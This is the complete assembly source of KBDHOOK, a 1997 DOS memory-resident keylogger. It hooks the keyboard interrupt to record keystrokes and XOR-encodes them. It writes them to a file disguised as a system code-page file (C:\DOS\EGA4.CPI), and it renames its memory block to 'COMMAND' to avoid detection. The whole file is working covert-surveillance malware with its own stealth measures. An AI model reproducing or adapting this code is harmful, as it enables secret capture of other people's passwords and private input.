;***********************************
; KBDHOOK, version 1.0.
; Copyright (C) 1997 by CodeMaster.
; Fidonet: 2:5002/39.
; E-mail: cm@liceum.secna.ru.
;***********************************

        p386
        ideal
        model   tiny

CODE            = 4b480100h
BUF_SIZE        = 128
XOR_CODE        = 4b48h
RESIDENT_SIZE   = resident_end-resident_start
PSP_SIZE        = 0100h
PSP_FREE        = 0080h
OFFSET_DEC      = PSP_SIZE-PSP_FREE
CRITICAL_BUFPTR = BUF_SIZE/2
BUF             = resident_end

macro   hookintvec vec
        mov     ax, 3500h+vec
        int     21h
        mov     [oldint&vec&ofs-OFFSET_DEC], bx
        mov     [oldint&vec&seg-OFFSET_DEC], es
        mov     ax, 2500h+vec
        lea     dx, [_int&vec-OFFSET_DEC]
        int     21h
endm    hookintvec

macro   restintvec vec
        mov     dx, [es:oldint&vec&ofs-OFFSET_DEC]
        mov     ds, [es:oldint&vec&seg-OFFSET_DEC]
        mov     ax, 2500h+vec
        int     21h
endm    restintvec

macro   writeln attr, st:rest
local   @@1, @@2
dataseg
@@1:
ifnb    <st>
                db st, 0dh, 0ah
endif
@@2:
codeseg
        lea     dx, [@@1]
        mov     cx, @@2-@@1
        mov     bx, attr
        call    _printh
endm    writeln

dataseg
mcb_name        db 'COMMAND', 0

codeseg
        startupcode

        label   resident_start

        jmp     @start

        assume  cs:@code, ds:nothing, es:nothing, ss:nothing

tsrlabel        dd CODE
lastptr         dw 0
bufptr          dw 0
gates08h        db 0
filename        db "C:\DOS\EGA4.CPI", 0
indosofs        dw 0
indosseg        dw 0

_int09h:
        pushf
                db 9ah
oldint09hofs    dw ?
oldint09hseg    dw ?

        cmp     [bufptr-OFFSET_DEC], BUF_SIZE-4
        ja      @@return

        pusha
        push    ds 0040h
        pop     ds

        mov     ax, [ds:001ch]
        cmp     ax, [lastptr-OFFSET_DEC]
        je      @@not_save

        cmp     [lastptr-OFFSET_DEC], 0
        jne     @@continue
        dec     ax
        dec     ax
        mov     [lastptr-OFFSET_DEC], ax
        jmp     @@not_save

@@continue:
        mov     bx, [lastptr-OFFSET_DEC]
        mov     dx, [ds:bx]
        xor     dx, XOR_CODE

        mov     di, [bufptr-OFFSET_DEC]
        mov     [word BUF+di-OFFSET_DEC], dx
        inc     [bufptr-OFFSET_DEC]
        inc     [bufptr-OFFSET_DEC]

@@not_save:
        mov     [lastptr-OFFSET_DEC], ax

        pop     ds
        popa

@@return:
        iret

_int08h:
        pushf
                db 9ah
oldint08hofs    dw ?
oldint08hseg    dw ?
        cmp     [gates08h-OFFSET_DEC], 0
        jnz     @@exit_int

        inc     [gates08h-OFFSET_DEC]
        call    _flush_with_check
        dec     [gates08h-OFFSET_DEC]

@@exit_int:
        iret

_int28h:
        call    _can_flush
                db 0eah
oldint28hofs    dw ?
oldint28hseg    dw ?

_flush_with_check:
        push    ds si
        mov     ds, [indosseg-OFFSET_DEC]
        mov     si, [indosofs-OFFSET_DEC]
        cmp     [byte ds:si], 0
        pop     si      ds
        jz      _can_flush
        ret

_can_flush:
        cmp     [bufptr-OFFSET_DEC], CRITICAL_BUFPTR
        jae     @@flush
        ret

@@flush:
        push    cs
        call    _flush_buf
        ret

_flush_buf:
        pusha
        push    ds es cs
        pop     ds

        assume  ds:@code

        mov     ax, 3d01h
        lea     dx, [filename-OFFSET_DEC]
        int     21h
        jnc     @@write_buffer

        mov     ah, 3ch
        xor     cx, cx
        int     21h
        jc      @@clear_and_exit

@@write_buffer:
        mov     bx, ax
        mov     ax, 4202h
        xor     cx, cx
        xor     dx, dx
        int     21h
        jc      @@close

        mov     ah, 40h
        mov     cx, [bufptr-OFFSET_DEC]
        lea     dx, [BUF-OFFSET_DEC]
        int     21h

@@close:
        mov     ah, 3eh
        int     21h

@@clear_and_exit:
        mov     [bufptr-OFFSET_DEC], 0

        pop     es      ds
        popa

        retf

label   resident_end

        assume  cs:@code, ds:@data, es:@data, ss:@stack

@start:
        writeln 0eh, "KBDHOOK,  version 1.0 (assembly version)."
        writeln 0bh, "Copyright (C) 1997 by Eugene Nonko aka CodeMaster, Fidonet: 2:5002/39."
        writeln 0ah, "E-mail: Eugene.Nonko@f39.n5002.z2.fidonet.org."
        writeln 07h, ""

        mov     ax, [002ch]
        mov     es, ax
        mov     ah, 49h
        int     21h

        push    cs
        pop     es
        mov     si, PSP_SIZE
        mov     di, PSP_FREE
        mov     cx, RESIDENT_SIZE
        rep     movsb

        mov     ax, 3509h
        int     21h
        cmp     [es:tsrlabel-OFFSET_DEC], CODE
        je      @uninstall

        mov     ax, cs
        dec     ax
        mov     es, ax
        lea     si, [mcb_name]
        mov     di, 0008h
        mov     cx, di
        rep     movsb

        hookintvec 09h
        hookintvec 08h
        hookintvec 28h

        writeln 07h, "Installed, rerun  to uninstall."

        mov     ah, 34h
        int     21h
        mov     [indosseg-OFFSET_DEC], es
        mov     [indosofs-OFFSET_DEC], bx

        mov     ax, 3100h
        mov     dx, (RESIDENT_SIZE+PSP_SIZE+BUF_SIZE-OFFSET_DEC+15)/16
        int     21h

@uninstall:
        restintvec 09h
        restintvec 08h
        restintvec 28h

        lea     ax, [@@return]
        lea     bx, [_flush_buf-OFFSET_DEC]
        push    cs ax es bx
        retf

@@return:
        mov     ah, 49h
        int     21h

        push    cs
        pop     ds

        writeln 07h, "Uninstalled."

        ret

_printh:
        mov     ax, 0920h
        int     10h
        mov     ah, 40h
        xor     bx, bx
        int     21h
        ret

        end
